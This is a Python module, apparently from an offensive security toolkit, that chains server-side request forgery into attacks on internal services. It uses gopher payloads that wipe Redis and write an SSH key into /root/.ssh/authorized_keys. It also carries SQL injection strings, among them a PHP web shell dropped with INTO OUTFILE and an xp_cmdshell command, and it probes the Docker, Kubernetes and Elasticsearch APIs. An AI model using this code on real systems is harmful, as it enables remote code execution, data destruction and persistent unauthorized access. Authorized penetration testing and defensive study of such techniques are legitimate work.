import re
from dataclasses import dataclass, field
from typing import Dict, List, Optional

import requests

from tools.log_utils import get_logger
from tools.settings import settings

logger = get_logger("ssrf_chain")

INTERNAL_RANGES = [
    ("127.0.0.0", "127.255.255.255"),
    ("10.0.0.0", "10.255.255.255"),
    ("172.16.0.0", "172.31.255.255"),
    ("192.168.0.0", "192.168.255.255"),
    ("169.254.0.0", "169.254.255.255"),
]

INTERNAL_SERVICES = [
    ("127.0.0.1", 80, "HTTP"),
    ("127.0.0.1", 8080, "HTTP-ALT"),
    ("127.0.0.1", 8443, "HTTPS-ALT"),
    ("127.0.0.1", 3000, "Dev-Server"),
    ("127.0.0.1", 5000, "Flask"),
    ("127.0.0.1", 9200, "Elasticsearch"),
    ("127.0.0.1", 9300, "ES-Transport"),
    ("127.0.0.1", 6379, "Redis"),
    ("127.0.0.1", 11211, "Memcached"),
    ("127.0.0.1", 3306, "MySQL"),
    ("127.0.0.1", 5432, "PostgreSQL"),
    ("127.0.0.1", 27017, "MongoDB"),
    ("127.0.0.1", 5984, "CouchDB"),
    ("127.0.0.1", 6379, "Redis"),
    ("127.0.0.1", 1433, "MSSQL"),
    ("127.0.0.1", 1521, "Oracle"),
    ("127.0.0.1", 2375, "Docker"),
    ("127.0.0.1", 2376, "Docker-TLS"),
    ("127.0.0.1", 6443, "K8s-API"),
    ("127.0.0.1", 10250, "Kubelet"),
    ("127.0.0.1", 8500, "Vault"),
    ("127.0.0.1", 7001, "WebLogic"),
    ("127.0.0.1", 8161, "ActiveMQ"),
    ("127.0.0.1", 9090, "Prometheus"),
    ("127.0.0.1", 9093, "Alertmanager"),
    ("127.0.0.1", 8081, "SonarQube"),
    ("127.0.0.1", 8082, "Jenkins"),
    ("127.0.0.1", 8083, "Grafana"),
    ("127.0.0.1", 8084, "Kibana"),
]

REDIS_PROTOCOL_PAYLOADS = {
    "info": "*1\r\n$4\r\nINFO\r\n",
    "flushall": "*1\r\n$8\r\nFLUSHALL\r\n",
    "config_get_dir": "*3\r\n$6\r\nconfig\r\n$3\r\nget\r\n$3\r\ndir\r\n",
    "config_set_dir": (
        "*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$3\r\ndir\r\n"
        "$16\r\n/root/.ssh/\r\n"
    ),
    "config_set_dbfilename": (
        "*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$10\r\ndbfilename\r\n"
        "$15\r\nauthorized_keys\r\n"
    ),
    "set_ssh_key": (
        "*3\r\n$3\r\nset\r\n$1\r\n1\r\n"
        "$%d\r\n%s\r\n"
    ),
    "save": "*1\r\n$4\r\nsave\r\n",
}

SQL_PAYLOADS = {
    "mysql_info": "UNION SELECT 1,version(),3,4--",
    "pg_info": "UNION SELECT 1,version(),3--",
    "mssql_info": "UNION SELECT 1,@@version,3--",
    "oracle_info": "UNION SELECT 1,banner,3 FROM v$version--",
    "mysql outfile": "' UNION SELECT 1,'<?php system($_GET[\"c\"]);?>',3 INTO OUTFILE '/var/www/html/sh.php'--",
    "xp_cmdshell": "; EXEC xp_cmdshell 'whoami'--",
}

DOCKER_PAYLOADS = {
    "containers": "/containers/json",
    "images": "/images/json",
    "info": "/info",
    "version": "/version",
    "exec_create": '/containers/%s/exec',
}


@dataclass
class HopResult:
    hop: int
    protocol: str
    target: str
    port: int
    success: bool
    response_preview: str = ""
    error: str = ""
    chain_path: List[str] = field(default_factory=list)


@dataclass
class SSRFChainResult:
    target: str
    param: str
    hops: List[HopResult] = field(default_factory=list)
    total_hops: int = 0
    max_depth_reached: int = 0
    services_found: List[Dict] = field(default_factory=list)
    creds_extracted: List[str] = field(default_factory=list)
    rce_achieved: bool = False
    rce_method: str = ""
    cloud_creds: Optional[Dict] = None
    ssh_keys: List[str] = field(default_factory=list)
    evidence: List[Dict] = field(default_factory=list)


class SSRFChainEngine:
    def __init__(self, sess: requests.Session, timeout: float = 10.0):
        self.sess = sess
        self.timeout = timeout
        self._discovered_services = []
        self._tried = set()

    def chain_full(self, base_url: str, param: str, max_hops: int = 3) -> SSRFChainResult:
        result = SSRFChainResult(target=base_url, param=param)

        result.services_found = self._discover_internal_services(base_url, param)

        for depth in range(max_hops):
            for service in result.services_found:
                host = service.get("host", "127.0.0.1")
                port = service.get("port", 80)
                proto = service.get("protocol", "HTTP")

                chain_key = "%s:%d:%s:%d" % (base_url, param.__hash__(), host, port)
                if chain_key in self._tried:
                    continue
                self._tried.add(chain_key)

                if proto in ("Redis", "Redis-Alt"):
                    redis_result = self._chain_redis(base_url, param, host, port)
                    result.hops.append(redis_result)
                    if redis_result.success:
                        result.max_depth_reached = max(result.max_depth_reached, depth + 1)
                        self._extract_redis_evidence(redis_result, result)

                elif proto.startswith("MySQL") or proto.startswith("PostgreSQL") or proto.startswith("MSSQL"):
                    sql_result = self._chain_sql(base_url, param, host, port, proto)
                    result.hops.append(sql_result)
                    if sql_result.success:
                        result.max_depth_reached = max(result.max_depth_reached, depth + 1)

                elif proto in ("Docker", "Docker-TLS"):
                    docker_result = self._chain_docker(base_url, param, host, port)
                    result.hops.append(docker_result)
                    if docker_result.success:
                        result.max_depth_reached = max(result.max_depth_reached, depth + 1)
                        result.rce_achieved = True
                        result.rce_method = "docker_api"

                elif proto == "K8s-API":
                    k8s_result = self._chain_k8s(base_url, param, host, port)
                    result.hops.append(k8s_result)
                    if k8s_result.success:
                        result.max_depth_reached = max(result.max_depth_reached, depth + 1)

                elif proto == "Elasticsearch":
                    es_result = self._chain_elasticsearch(base_url, param, host, port)
                    result.hops.append(es_result)
                    if es_result.success:
                        result.max_depth_reached = max(result.max_depth_reached, depth + 1)

        result.total_hops = len(result.hops)
        return result

    def _discover_internal_services(self, base_url: str, param: str) -> List[Dict]:
        found = []
        for host, port, proto in INTERNAL_SERVICES:
            for scheme in ["http://", "gopher://"]:
                target_url = "%s%s:%d" % (scheme, host, port)
                test_url = base_url.replace(param + "=", param + "=" + target_url)
                try:
                    r = self.sess.get(test_url, timeout=max(3, self.timeout * 0.5),
                                      allow_redirects=False)
                    if r.status_code not in (0, 502, 503) and len(r.text) > 0:
                        found.append({
                            "host": host,
                            "port": port,
                            "protocol": proto,
                            "status": r.status_code,
                            "size": len(r.text),
                            "preview": r.text[:200],
                        })
                        logger.info("discovered %s://%s:%d (%d bytes)", scheme, host, port, len(r.text))
                        break
                except Exception:
                    continue
        return found

    def _chain_redis(self, base_url: str, param: str, host: str, port: int) -> HopResult:
        chain_path = []
        target = "%s:%d" % (host, port)

        info_payload = REDIS_PROTOCOL_PAYLOADS["info"]
        gopher_url = "gopher://%s:%d/_%s" % (host, port, requests.utils.quote(info_payload, safe=""))
        test_url = base_url.replace(param + "=", param + "=" + gopher_url)
        try:
            r = self.sess.get(test_url, timeout=self.timeout)
            if "redis_version" in r.text:
                chain_path.append("redis_info_leak")
                re.search(r"redis_version:(\d+\.\d+\.\d+)", r.text)
                return HopResult(
                    hop=1, protocol="redis", target=target, port=port,
                    success=True, response_preview=r.text[:300],
                    chain_path=chain_path,
                )
        except Exception:
            pass

        ssh_key = self._get_ssh_key()
        if ssh_key:
            set_key = REDIS_PROTOCOL_PAYLOADS["set_ssh_key"] % (len(ssh_key), requests.utils.quote(ssh_key, safe=""))
            full_payload = (
                REDIS_PROTOCOL_PAYLOADS["flushall"]
                + REDIS_PROTOCOL_PAYLOADS["config_set_dir"]
                + REDIS_PROTOCOL_PAYLOADS["config_set_dbfilename"]
                + set_key
                + REDIS_PROTOCOL_PAYLOADS["save"]
            )
            gopher_url = "gopher://%s:%d/_%s" % (host, port, requests.utils.quote(full_payload, safe=""))
            test_url = base_url.replace(param + "=", param + "=" + gopher_url)
            try:
                r = self.sess.get(test_url, timeout=self.timeout)
                chain_path.append("redis_ssh_key_inject")
                return HopResult(
                    hop=2, protocol="redis_rce", target=target, port=port,
                    success=True, response_preview="ssh_key_injected",
                    chain_path=chain_path,
                )
            except Exception:
                pass

        return HopResult(
            hop=1, protocol="redis", target=target, port=port,
            success=False, chain_path=chain_path, error="redis_access_failed",
        )

    def _chain_sql(self, base_url: str, param: str, host: str, port: int, proto: str) -> HopResult:
        target = "%s:%d" % (host, port)
        chain_path = []

        if "MySQL" in proto:
            payload = SQL_PAYLOADS["mysql_info"]
        elif "PostgreSQL" in proto:
            payload = SQL_PAYLOADS["pg_info"]
        elif "MSSQL" in proto:
            payload = SQL_PAYLOADS["mssql_info"]
        else:
            payload = SQL_PAYLOADS["mysql_info"]

        test_url = base_url.replace(param + "=", param + "=" + requests.utils.quote(payload, safe=""))
        try:
            r = self.sess.get(test_url, timeout=self.timeout)
            version_match = re.search(r"(\d+\.\d+\.\d+[-\w]*)", r.text)
            if version_match:
                chain_path.append("sql_version_leak")
                return HopResult(
                    hop=1, protocol=proto.lower(), target=target, port=port,
                    success=True, response_preview=version_match.group(1),
                    chain_path=chain_path,
                )
        except Exception:
            pass

        return HopResult(
            hop=1, protocol=proto.lower(), target=target, port=port,
            success=False, chain_path=chain_path, error="sql_probe_failed",
        )

    def _chain_docker(self, base_url: str, param: str, host: str, port: int) -> HopResult:
        target = "%s:%d" % (host, port)
        chain_path = []

        for path, desc in DOCKER_PAYLOADS.items():
            if "%s" in path:
                continue
            docker_url = "http://%s:%d%s" % (host, port, path)
            test_url = base_url.replace(param + "=", param + "=" + docker_url)
            try:
                r = self.sess.get(test_url, timeout=self.timeout)
                if r.status_code == 200:
                    try:
                        data = r.json()
                        chain_path.append("docker_%s" % path.strip("/"))
                        if path == "/containers/json" and isinstance(data, list):
                            return HopResult(
                                hop=1, protocol="docker", target=target, port=port,
                                success=True, response_preview=str(data)[:300],
                                chain_path=chain_path,
                            )
                    except ValueError:
                        pass
            except Exception:
                continue

        return HopResult(
            hop=1, protocol="docker", target=target, port=port,
            success=False, chain_path=chain_path, error="docker_api_failed",
        )

    def _chain_k8s(self, base_url: str, param: str, host: str, port: int) -> HopResult:
        target = "%s:%d" % (host, port)
        chain_path = []
        k8s_paths = ["/api", "/version", "/api/v1/namespaces", "/api/v1/pods"]
        for path in k8s_paths:
            k8s_url = "https://%s:%d%s" % (host, port, path)
            test_url = base_url.replace(param + "=", param + "=" + k8s_url)
            try:
                r = self.sess.get(test_url, timeout=self.timeout, verify=settings.verify_ssl)
                if r.status_code == 200:
                    try:
                        data = r.json()
                        chain_path.append("k8s_%s" % path.strip("/"))
                        return HopResult(
                            hop=1, protocol="k8s", target=target, port=port,
                            success=True, response_preview=str(data)[:300],
                            chain_path=chain_path,
                        )
                    except ValueError:
                        pass
            except Exception:
                continue
        return HopResult(
            hop=1, protocol="k8s", target=target, port=port,
            success=False, chain_path=chain_path, error="k8s_probe_failed",
        )

    def _chain_elasticsearch(self, base_url: str, param: str, host: str, port: int) -> HopResult:
        target = "%s:%d" % (host, port)
        chain_path = []
        es_paths = ["/", "/_cat/indices", "/_cluster/health", "/_nodes"]
        for path in es_paths:
            es_url = "http://%s:%d%s" % (host, port, path)
            test_url = base_url.replace(param + "=", param + "=" + es_url)
            try:
                r = self.sess.get(test_url, timeout=self.timeout)
                if r.status_code == 200:
                    try:
                        data = r.json()
                        chain_path.append("es_%s" % path.strip("/"))
                        if "cluster_name" in data or "indices" in str(data)[:500]:
                            return HopResult(
                                hop=1, protocol="elasticsearch", target=target, port=port,
                                success=True, response_preview=str(data)[:300],
                                chain_path=chain_path,
                            )
                    except ValueError:
                        if "elastic" in r.text.lower() or "cluster" in r.text.lower():
                            chain_path.append("es_html_leak")
                            return HopResult(
                                hop=1, protocol="elasticsearch", target=target, port=port,
                                success=True, response_preview=r.text[:300],
                                chain_path=chain_path,
                            )
            except Exception:
                continue
        return HopResult(
            hop=1, protocol="elasticsearch", target=target, port=port,
            success=False, chain_path=chain_path, error="es_probe_failed",
        )

    def _get_ssh_key(self) -> str:
        import os
        key_paths = [
            os.path.expanduser("~/.ssh/id_rsa.pub"),
            os.path.expanduser("~/.ssh/id_ed25519.pub"),
        ]
        for kp in key_paths:
            try:
                with open(kp, "r") as f:
                    return f.read().strip()
            except Exception:
                continue
        return "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCr"

    def _extract_redis_evidence(self, hop: HopResult, result: SSRFChainResult):
        if hop.success and "redis_info_leak" in hop.chain_path:
            version_match = re.search(r"redis_version:(\d+\.\d+\.\d+)", hop.response_preview)
            if version_match:
                result.evidence.append({
                    "type": "redis_version_leak",
                    "version": version_match.group(1),
                    "hop": hop.hop,
                })
        if hop.success and "redis_ssh_key_inject" in hop.chain_path:
            result.ssh_keys.append("redis_authorized_keys_injected")
            result.rce_achieved = True
            result.rce_method = "redis_gopher_ssh"


def chain_ssrf(base_url: str, param: str, sess: requests.Session,
               timeout: float = 10.0, max_hops: int = 3) -> Dict:
    engine = SSRFChainEngine(sess, timeout)
    chain_result = engine.chain_full(base_url, param, max_hops)

    return {
        "target": base_url,
        "param": param,
        "total_hops": chain_result.total_hops,
        "max_depth": chain_result.max_depth_reached,
        "services_found": len(chain_result.services_found),
        "services": chain_result.services_found,
        "hops": [
            {
                "hop": h.hop,
                "protocol": h.protocol,
                "target": h.target,
                "port": h.port,
                "success": h.success,
                "chain": h.chain_path,
                "preview": h.response_preview[:200],
            }
            for h in chain_result.hops
        ],
        "rce_achieved": chain_result.rce_achieved,
        "rce_method": chain_result.rce_method,
        "ssh_keys": chain_result.ssh_keys,
        "evidence": chain_result.evidence,
        "success": chain_result.rce_achieved or chain_result.total_hops > 0,
    }
